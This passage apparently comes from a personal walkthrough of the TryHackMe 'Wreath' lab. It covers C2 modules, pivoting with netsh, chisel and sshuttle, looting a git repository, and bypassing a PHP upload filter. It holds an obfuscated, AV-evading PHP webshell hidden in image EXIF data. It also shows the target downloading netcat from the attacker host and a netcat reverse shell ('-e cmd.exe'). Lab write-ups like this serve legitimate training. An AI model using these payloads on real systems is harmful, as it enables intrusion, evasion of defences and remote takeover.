Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable






(Empire: LSYMEK1D) >
```

If we know approximately what we want to do, but don't know the exact path to a module, we can just type `usemodule NAME_OF_MODULE` and it should come up in the dropdown menu:

```shell
(Empire: LSYMEK1D) > usemodule sher
                                    powershell_privesc_sherlock  

```

### Starkiller

First we switch over to the modules menu. In the left menu we can search for our desired module. Let's search for the Sherlock module again:

![wreath27](./assets/wreath27.png)

Select the module by clicking on its name.

From here we click on the Agents menu, then select the agent(s) to use the module through:

![wreath28](./assets/wreath28.png)

Click `Submit` to run the module!

To view the results we need to switch over to the `Notifications` section of the main menu on the left side of the window:

![wreath29](./assets/wreath29.png)

Clicking on the task result, this will take you to the tasks of the agent. Click the dropdown arrow of the task you like to see the result.

![wreath30](./assets/wreath30.png)

## Task 31 - Command and Control - Empire: Interactive Shell

The interactive shell was a new feature in Empire 4.0. It effectively allows you to access a traditional pseudo-command shell from within Starkiller or the Empire CLI Client. This can be used to execute PowerShell commands, as you would in a Powershell reverse shell.

### Empire CLI

To access the interactive shell in the Empire CLI Client, we can use the `shell` command from within the context of an agent:

```shell
(Empire: agents) > interact LSYMEK1D
(Empire: LSYMEK1D) > shell
INFO: Exit Shell Menu with Ctrl+C 
(LSYMEK1D)  > whoami
NT AUTHORITY\SYSTEM
(LSYMEK1D) C:\GitStack\gitphp >
```

### Starkiller

In Starkiller this is even easier as the shell can be found directly in the Agent interaction interface where you can run the new `TERMINAL (BETA)`

![wreath31](./assets/wreath31.png)

## Task 33 - Personal PC - Enumeration

We know from the briefing that this target is likely to be the other Windows machine on the network. By process of elimination we can tell that this is Thomas' PC which he told us has antivirus software installed. If we're very lucky it will be out of date though!

To enumerate this host we need to do it from the compromised Windows host. either we need to upload tools and execute on the target host or we can use proxy to execute local scripts.

Let's scan Thomas' PC using `Invoke-Portscan`

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.101.100 -TopPorts 50


Hostname      : 10.200.101.100
alive         : True
openPorts     : {<MASKED PORTS>}
closedPorts   : {}
filteredPorts : {445, 443, 21, 23...}
finishTime    : 2/27/2024 9:58:17 AM
```

## Task 34 - Personal PC - Pivoting

Wreath told us that he worked on his website using a local environment on his own PC, so this bleeding-edge version may contain some vulnerabilities that we could use to exploit the target. Before we can do that, however, we must figure out how to access the development webserver on Wreath's PC from our attacking machine.

Here I will setup a port forward.

First I will use netsh to open my port and then forward the port to the port 80 in Thomas' PC and then test that the port is listening. In this case port 30000.

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> netsh advfirewall firewall add rule name="forwarded-webserver-DA" dir=in action=allow protocol=tcp localport=30000
Ok.

*Evil-WinRM* PS C:\Users\Administrator\Documents> netsh interface portproxy add v4tov4 listenaddress=10.200.101.150 listenport=30000 connectaddress=10.200.101.100 connectport=80

*Evil-WinRM* PS C:\Users\Administrator\Documents> Test-NetConnection -ComputerName 10.200.101.150 -Port 30000


ComputerName     : 10.200.101.150
RemoteAddress    : 10.200.101.150
RemotePort       : 30000
InterfaceAlias   : Ethernet
SourceAddress    : 10.200.101.150
TcpTestSucceeded : True
```

You can also check the port forward:

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> netsh interface portproxy show all

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.200.101.150  30000       10.200.101.100  80
```

Then I will setup a local port to prod-serv that will point to the compromised machine where we opened the port 30000. And then add a firewall rule on prod-serv as well.

```shell
kali@attacker:~/wreath$ ssh -i ./id_rsa -L 80:10.200.101.150:30000 root@10.200.101.200
[root@prod-serv ~]# firewall-cmd --zone=public --add-port 30000/tcp
success
```

Brief explanation.

Local attacker machine port 80 is forwarded to compromised windows machine `.150` port 30000 via the webserver `.200`. And then `.150` port 30000 is forwarded to Thomas' PC `.100` port 80.

Now, from my local attach machine I can curl the remote webserver and get the server information from the header. To see if there is any useful information.

```shell
kali@attacker:~/wreath$ curl -I http://localhost:80 
HTTP/1.1 200 OK
Date: Tue, 27 Feb 2024 10:53:36 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
Last-Modified: Sun, 08 Nov 2020 15:46:48 GMT
ETag: "3dc7-5b39a5a80eecc"
Accept-Ranges: bytes
Content-Length: 15815
Content-Type: text/html
```

If we like to cleanup on the compromised windows machine `.150` we can remove the port forward and then remove the open port in firewall.

Remove firewall rule.

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> netsh advfirewall firewall del rule name="forwarded-webserver-DA"

Deleted 1 rule(s).
Ok.
```

Remove port forwarding rule:

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> netsh interface portproxy delete v4tov4 listenport=30000 listenaddress=10.200.101.150

*Evil-WinRM* PS C:\Users\Administrator\Documents> netsh interface portproxy show all

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

### Using sshuttle and chisel

Let's also catch up using sshuttle and chisel

Tunnel all traffic from local machine to network 10.200.93.* through the webserver `.200`

```shell
kali@attacker:~/wreath$ sshuttle -r root@10.200.101.200 --ssh-cmd "ssh -i id_rsa" 10.200.101.0/24 -x 10.200.101.200
c : Connected to server.
```

Download linux and windows binary.

```shell
kali@attacker:~/wreath/tools$ wget https://github.com/jpillora/chisel/releases/download/v1.9.0/chisel_1.9.0_linux_amd64.gz
--2024-02-28 19:35:31--  https://github.com/jpillora/chisel/releases/download/v1.9.0/chisel_1.9.0_linux_amd64.gz
Resolving github.com (github.com)... 20.27.177.113
Connecting to github.com (github.com)|20.27.177.113|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/31311037/4264926e-211e-40dd-94e8-059fba0aa8ca?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240229%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240229T003531Z&X-Amz-Expires=300&X-Amz-Signature=93a7fb29abbeeedfa6c62cae38f3acac0e8c74b8e900eb38916b2d3e1477a0c0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=31311037&response-content-disposition=attachment%3B%20filename%3Dchisel_1.9.0_linux_amd64.gz&response-content-type=application%2Foctet-stream [following]
--2024-02-28 19:35:32--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/31311037/4264926e-211e-40dd-94e8-059fba0aa8ca?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240229%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240229T003531Z&X-Amz-Expires=300&X-Amz-Signature=93a7fb29abbeeedfa6c62cae38f3acac0e8c74b8e900eb38916b2d3e1477a0c0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=31311037&response-content-disposition=attachment%3B%20filename%3Dchisel_1.9.0_linux_amd64.gz&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3617986 (3.5M) [application/octet-stream]
Saving to: ‘chisel_1.9.0_linux_amd64.gz’

chisel_1.9.0_linux_amd64.gz                                 100%[========================================================================================================================================>]   3.45M  5.61MB/s    in 0.6s    

2024-02-28 19:35:33 (5.61 MB/s) - ‘chisel_1.9.0_linux_amd64.gz’ saved [3617986/3617986]

kali@attacker:~/wreath/tools$ wget https://github.com/jpillora/chisel/releases/download/v1.9.0/chisel_1.9.0_windows_amd64.gz
--2024-02-28 19:35:43--  https://github.com/jpillora/chisel/releases/download/v1.9.0/chisel_1.9.0_windows_amd64.gz
Resolving github.com (github.com)... 20.27.177.113
Connecting to github.com (github.com)|20.27.177.113|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/31311037/9bed854c-939c-4995-8a07-e976df1f0718?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240229%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240229T003543Z&X-Amz-Expires=300&X-Amz-Signature=f1b43f2f77e4bf1ddc3a7adae2d8961054eb6c01e543e16df0ddaaa0aff9c302&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=31311037&response-content-disposition=attachment%3B%20filename%3Dchisel_1.9.0_windows_amd64.gz&response-content-type=application%2Foctet-stream [following]
--2024-02-28 19:35:44--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/31311037/9bed854c-939c-4995-8a07-e976df1f0718?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240229%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240229T003543Z&X-Amz-Expires=300&X-Amz-Signature=f1b43f2f77e4bf1ddc3a7adae2d8961054eb6c01e543e16df0ddaaa0aff9c302&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=31311037&response-content-disposition=attachment%3B%20filename%3Dchisel_1.9.0_windows_amd64.gz&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3740296 (3.6M) [application/octet-stream]
Saving to: ‘chisel_1.9.0_windows_amd64.gz’

chisel_1.9.0_windows_amd64.gz                               100%[========================================================================================================================================>]   3.57M  12.9MB/s    in 0.3s    

2024-02-28 19:35:45 (12.9 MB/s) - ‘chisel_1.9.0_windows_amd64.gz’ saved [3740296/3740296]

```

Rename and make executable.

```shell
kali@attacker:~/wreath/tools$ gunzip *.gz
kali@attacker:~/wreath/tools$ mv chisel_1.9.0_windows_amd64 chisel-DA.exe
kali@attacker:~/wreath/tools$ chmod +x chisel_1.9.0_linux_amd64 
```

Upload the windows binary.

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /home/kali/wreath/tools/chisel-DA.exe c:\windows\temp\chisel-DA.exe
                                        
Info: Uploading /home/kali/wreath/tools/chisel-DA.exe to c:\windows\temp\chisel-DA.exe
                                        
Data: 12008104 bytes of 12008104 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Open the port in firewall and start the server.

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> netsh advfirewall firewall add rule name="chisel-DA" dir=in action=allow protocol=tcp localport=40000
*Evil-WinRM* PS C:\Users\Administrator\Documents> c:\windows\temp\chisel-DA.exe server -p 40000 --socks5
chisel-DA.exe : 2024/02/29 00:49:55 server: Fingerprint bciy7VLMIJUMoew8T0VP1KPvjp+iY7AR4klbzYwA7D0=
    + CategoryInfo          : NotSpecified: (2024/02/29 00:4...7AR4klbzYwA7D0=:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2024/02/29 00:49:55 server: Listening on http://0.0.0.0:40000
```

Connect from our local machine

```shell
kali@attacker:~/wreath$ ./tools/chisel_1.9.0_linux_amd64 client 10.200.101.150:40000 9000:socks
2024/02/28 19:51:40 client: Connecting to ws://10.200.101.150:30000
2024/02/28 19:51:40 client: tun: proxy#127.0.0.1:9000=>socks: Listening
```

And connect to the page.

Remember configure the browser connect to the proxy at port 9000 first.

## Task 35 - Personal PC - The Wonders of Git

We know from the brief that Thomas has been using git server to version control his projects.

Let's see if we can get it from the windows machine `.150`.

I will start with a search for .git in the root directory.

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ChildItem -Path c:\ -Recurse -Filter *.git


    Directory: C:\GitStack\repositories


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2021   7:05 PM                Website.git
```

Great, I think we found it. Let's download it.

Note: The download will take a while, but should complete after a minute or two!

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> download C:\GitStack\repositories\Website.git /home/kali/wreath/repository/Website.git
                                        
Info: Downloading C:\GitStack\repositories\Website.git to /home/kali/wreath/repository/Website.git
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Locally we can now find the Website.git, let's rename this directory to .git so we can continue work with it.

Git repositories always contain a special directory called `.git` which contains all of the meta-information for the repository. This directory can be used to fully recreate a readable copy of the repository, including things like version control and branches. If the repository is local then this directory would be a part of the full repository -- the rest of which would be the items of the repository in a human-readable format; however, as the `.git` directory is enough to recreate the repository in its entirety, the server doesn't need to store the easily readable versions of the files. This means that what we've downloaded isn't actually the full repository, so much as the building blocks we can use to recreate the repo (which is exactly what happens when using `git clone` to create a local copy of a repo!).

In order to extract the information from the repository, we use a suite of tools called GitTools.

Clone the GitTools repository into your current directory using:

`git clone https://github.com/internetwache/GitTools`

The GitTools repository contains three tools:

- Dumper can be used to download an exposed `.git` directory from a website should the owner of the site have forgotten to delete it
- Extractor can be used to take a local `.git` directory and recreate the repository in a readable format. This is designed to work in conjunction with the Dumper, but will also work on the repo that we stole from the Git server. Unfortunately for us, whilst Extractor will give us each commit in a readable format, it will not sort the commits by date
- Finder can be used to search the internet for sites with exposed `.git` directories. This is significantly less useful to an ethical hacker, although may have applications in bug bounty programmes

Let's use Extractor to obtain a readable format of the repository!

The syntax for Extractor is as follows:
`./extractor.sh REPO_DIR DESTINATION_DIR`

```shell
ali@attacker:~/wreath/repository$ /home/kali/tools/GitTools/Extractor/extractor.sh . Website
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: 345ac8b236064b431fa43f53d91c98c4834ef8f3
CUT OUTPUT
```

We can see the tool found 3 commits.

```shell
kali@attacker:~/wreath/repository/Website$ ls -l
total 12
drwxr-xr-x 7 kali kali 4096 Feb 27 23:38 0-345ac8b236064b431fa43f53d91c98c4834ef8f3
drwxr-xr-x 6 kali kali 4096 Feb 27 23:38 1-70dde80cc19ec76704567996738894828f4ee895
drwxr-xr-x 7 kali kali 4096 Feb 27 23:38 2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
```

And let's see their create order.

```shell
kali@attacker:~/wreath/repository/Website$ separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"


=======================================
0-345ac8b236064b431fa43f53d91c98c4834ef8f3
tree c4726fef596741220267e2b1e014024b93fced78
parent 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
author twreath <me@thomaswreath.thm> 1609614315 +0000
committer twreath <me@thomaswreath.thm> 1609614315 +0000

Updated the filter


=======================================
1-70dde80cc19ec76704567996738894828f4ee895
tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
author twreath <me@thomaswreath.thm> 1604849458 +0000
committer twreath <me@thomaswreath.thm> 1604849458 +0000

Static Website Commit


=======================================
2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
tree 03f072e22c2f4b74480fcfb0eb31c8e624001b6e
parent 70dde80cc19ec76704567996738894828f4ee895
author twreath <me@thomaswreath.thm> 1608592351 +0000
committer twreath <me@thomaswreath.thm> 1608592351 +0000

Initial Commit for the back-end


=======================================
```

Here we can see three commit messages: `Updated the filter`, `Initial Commit for the back-end`, and `Static Website` Commit.

Note: The number at the start of these directories is arbitrary, and depends on the order in which GitTools extracts the directories. What matters is the hash at the end of the filename.

Logically speaking, we can guess that these are currently in reverse order based on the commit message; however, we could also check the parent value of each commit. Starting at the only commit without a parent (which must be the initial commit), we can work down the tree in stages like so:

We find the commit that has no parent (`70dde80cc19ec76704567996738894828f4ee895`), and check to see which of the other commits specifies it as a direct parent (`82dfc97bec0d7582d485d9031c09abcb5c6b18f2`). We then repeat the process to find the full commit order:

```text
70dde80cc19ec76704567996738894828f4ee895
82dfc97bec0d7582d485d9031c09abcb5c6b18f2
345ac8b236064b431fa43f53d91c98c4834ef8f3
```

We could also do this by checking the timestamps attached to the commits (in UNIX format, after the emails); however, it is possible to fake these. Feel free to use them, but be aware that they may not always be accurate.

## Task 36 - Personal PC - Website Code Analysis

Let's look for some `php` file where we might find vulnerability.

```shell
kali@attacker:~/wreath/repository/Website$ find ./ -name "*.php"
./0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/index.php
./2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/index.php
kali@attacker:~/wreath/repository/Website$
```

Let's look into `./0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/index.php`

This appears to be a file-upload point, so we might have the opportunity for a filter bypass here!

It also gives us an idea about the protections around the page itself.

In the code we can also find 2 filters and a check to see if the file already exists.

```php
$size = getimagesize($_FILES["file"]["tmp_name"]);
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
    header("location: ./?msg=Fail");
    die();
}
```

The first line here uses a classic PHP technique used to see if a file is an image. In short, images have their dimensions encoded in their exif data. The `getimagesize(`) method returns these dimensions if the file is genuinely an image, or the boolean value `False` if the file is not an image.

The second line is an If statement which checks two conditions. If either condition fails (indicated by the "Or" operator: `||`) then the script will redirect with a Failure message. The second condition is easy: `!$size` just checks to see if the `$size` variable contains the boolean `False`. The first condition may need to be broken down a little.

```php
!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts)
```

There are two functions in play here: `in_array()` and `explode()`. Let's start with the innermost function and work out the way:

```php
explode(".", $_FILES["file"]["name"])[1]
```

The `explode()` function is used to split a string at the specified character. Here it's being used to split the name of the file we uploaded at each period (`.`). From this we can (rightly) assume that this is a file-extension filter. As an example, if we were to upload a file called `image.jpeg`, this function would return a list: `["image", "jpeg"]`. As the filter only really needs the file-extension, it then grabs the second item from the list (`[1]`), remembering that lists start at 0.

This, unfortunately, leads to a big problem. What happens if there's more than one file extension? Let's say we upload a file called `image.jpeg.php`. The filename gets split into `["image", "jpeg", "php"]`, but only the `jpeg` (as the second element in the list) gets passed into the filter!

Looking at the outer function now (and replacing the inner function with a placeholder of `EXPLODE_RESULTS`):

```php
!in_array(EXPLODE_RESULTS, $goodExts)
```

This checks to see if the result returned by the `explode()` method is not in an array called `$goodExts`. In other words, this is a whitelist approach where only certain extensions will be accepted. The accepted extension list can be found in line 5 of the file.

Between lines 4 and 15:

```php
$target = "uploads/".basename($_FILES["file"]["name"]);
...
move_uploaded_file($_FILES["file"]["tmp_name"], $target);
```

We can see that the file will get moved into an `uploads/` directory with it's original name, assuming it passed the two filters.

In summary:

- We know how to find our uploaded files
- There are two file upload filters in play
- Both filters are possible to bypass

Let's explore that vulnerability.

## Task 37 - Personal PC - Exploit PoC

Ok, so we know what is likely to happen when we access this page:

- It will probably ask us for creds
- We'll be able to upload image files
- There are two filters in play to stop us from uploading other kinds of files
- Both of these filters can be bypassed

So let us browse to the page `/resources`. (Now using the connection via sshuttle and chisel)

Here we will be prompted to login.

![wreath32](./assets/wreath32.png)

We already got some login credentials for Thomas that we collected on the git server using Mimikatz. Let's try them and it will be success.

![wreath33](./assets/wreath33.png)

First I will generate a image to upload.

```shell
kali@attacker:~/wreath$ convert -size 32x32 xc:white test-DA.jpeg
```

We know we can bypass the first filter by changing the extension to .jpeg.php.

```shell
kali@attacker:~/wreath$ mv test-DA.jpeg test-DA.jpeg.php
```

Next, let's add the php code we like to execute in the image comment.

```shell
kali@attacker:~/wreath$ exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-DA.jpeg.php
    1 image files updated
```

Let's upload the image and then browse to it.

Great, it executed the php.

![wreath34](./assets/wreath34.png)

## Task 40 - AV Evasion - PHP Payload Obfuscation

Now we build the payload and obfuscate it to by pass anti virus software.

```php
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

It will see if a `GET` parameter called `wreath` has been set. If so, it is executed using shell_exec(), wrapped inside HTML `<pre>` tags to give clean output. Then use die() to prevent the rest of the image from showing up as garbled text on the screen.

This is slightly longer than the classic PHP one-liner webshell `<?php system($_GET["cmd"]);?>` for two reasons:

- If we're obfuscating it then it will become a one-liner anyway
- Anything different is good when it comes to AV evasion

To obfuscate we cna for example:

- Switching parts of the exploit around so that they're in an unusual order
- Encoding all of the strings so that they're not recognizable
- Splitting up distinctive parts of the code (e.g. shell_exec($_GET[...]))

The room recommend this tool to obfuscate.

[www.gaijin.at - tools - php-obfuscator](https://www.gaijin.at/en/tools/php-obfuscator)

Paste the code and click the `Obfuscate Source Code` button, and we're left with this mess of PHP:

`<?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>`

If you look closely you'll see that this is still very much the same payload as before; however, enough has changed that it should fool Defender.

As this is getting passed into a bash command, we will need to escape the dollar signs to prevent them from being interpreted as bash variables. This means our final payload is as follows:

`<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>`

Let's make a new image with the new payload.

```shell
kali@attacker:~/wreath$ exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-DA.jpeg.php
    1 image files updated
```

Upload the image and load it in the browser.

![wreath35](./assets/wreath35.png)

Great, we now have a shell that we can use by calling with command in the `wreath` parameter.

For example systeminfo.

`http://10.200.101.100/resources/uploads/shell-DA.jpeg.php?wreath=systeminfo`

![wreath36](./assets/wreath36.png)

And we can check what user we are.

`http://10.200.101.100/resources/uploads/shell-DA.jpeg.php?wreath=whoami`

## Task 41 - AV Evasion - Compiling Netcat & Reverse Shell!

As next step, let's go for reverse shell.

To achieve this we will download a netcat source and cross-compile using `mingw-w64`.

The room recommend this source.

[github - int0x33 nc](https://github.com/int0x33/nc.exe/)

Clone the repository.

```shell
kali@attacker:~/wreath/tools$ git clone https://github.com/int0x33/nc.exe/
Cloning into 'nc.exe'...
remote: Enumerating objects: 13, done.
remote: Total 13 (delta 0), reused 0 (delta 0), pack-reused 13
Receiving objects: 100% (13/13), 114.07 KiB | 4.75 MiB/s, done.
```

Remove the excising binaries.

```shell
kali@attacker:~/wreath/tools$ cd nc.exe/
kali@attacker:~/wreath/tools/nc.exe$ ls -l
total 308
-rw-r--r-- 1 kali kali   300 Feb 29 03:24 Makefile
-rw-r--r-- 1 kali kali 12166 Feb 29 03:24 doexec.c
-rw-r--r-- 1 kali kali  7283 Feb 29 03:24 generic.h
-rw-r--r-- 1 kali kali 22784 Feb 29 03:24 getopt.c
-rw-r--r-- 1 kali kali  4765 Feb 29 03:24 getopt.h
-rw-r--r-- 1 kali kali 61780 Feb 29 03:24 hobbit.txt
-rw-r--r-- 1 kali kali 18009 Feb 29 03:24 license.txt
-rw-r--r-- 1 kali kali 38616 Feb 29 03:24 nc.exe
-rw-r--r-- 1 kali kali 45272 Feb 29 03:24 nc64.exe
-rw-r--r-- 1 kali kali 69850 Feb 29 03:24 netcat.c
-rw-r--r-- 1 kali kali  6885 Feb 29 03:24 readme.txt
kali@attacker:~/wreath/tools/nc.exe$ rm nc.exe nc64.exe 
```

Update the compiler in `Makefile` to the `mingw` as `CC=x86_64-w64-mingw32-gcc`

```shell
kali@attacker:~/wreath/tools/nc.exe$ cat Makefile 

#CC=i686-pc-mingw32-gcc
#CC=x86_64-pc-mingw32-gcc
CC=x86_64-w64-mingw32-gcc
```

Now build binary:

```shell
kali@attacker:~/wreath/tools/nc.exe$ make 2>/dev/null
x86_64-w64-mingw32-gcc -DNDEBUG -DWIN32 -D_CONSOLE -DTELNET -DGAPING_SECURITY_HOLE getopt.c doexec.c netcat.c -s -lkernel32 -luser32 -lwsock32 -lwinmm -o nc.exe
kali@attacker:~/wreath/tools/nc.exe$ file nc.exe 
nc.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 10 sections
```

To upload the binary to target I will locally start a web server in the directory where the binary is available.

```shell
ali@attacker:~/wreath/tools/nc.exe$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Get the file with curl using the web shell.

`http://10.200.101.100/resources/uploads/shell-DA.jpeg.php?wreath=curl http://10.50.102.113/nc.exe -o c:\\windows\\temp\\nc-DA.exe`

Locally, start a listener.

```shell
kali@attacker:~/wreath$ sudo nc -lvnp 7000
[sudo] password for kali: 
listening on [any] 443 ...
```

And connect from the target to your local listener.

`http://10.200.101.100/resources/uploads/shell-DA.jpeg.php?wreath=powershell.exe c:\\windows\\temp\\nc-DA.exe 10.50.102.113 7000 -e cmd.exe`

Go back to the local machine listener and we have reverse shell.

```shell
kali@attacker:~/wreath$ sudo nc -lvnp 7000
listening on [any] 7000 ...
connect to [10.50.102.113] from (UNKNOWN) [10.200.101.100] 49929
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\resources\uploads>
```

## Task 42 - AV Evasion - Enumeration

Now we can use the reverse shell to continue enumeration for how we can do privilege escalation.

Check privileges.

```shell
C:\xampp\htdocs\resources\uploads>whoami /priv  
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Check groups:

```shell
C:\xampp\htdocs\resources\uploads>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
```

User installed services are more common to have vulnerabilities than windows services. So let us look for non-default services.

```shell
C:\xampp\htdocs\resources\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
DisplayName                                                                         Name                                      PathName                                                                                    StartMode  
Amazon SSM Agent                                                                    AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                          Auto       
Apache2.4                                                                           Apache2.4                                 "C:\xampp\apache\bin\httpd.exe" -k runservice                                               Auto       
AWS Lite Guest Agent                                                                AWSLiteAgent                              "C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                            Auto       
LSM                                                                                 LSM                                                                                                                                   Unknown    
Mozilla Maintenance Service                                                         MozillaMaintenance                        "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                 Manual     
NetSetupSvc                                                                         NetSetupSvc                                                                                                                           Unknown    
Windows Defender Advanced Threat Protection Service                                 Sense                                     "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                  Manual     
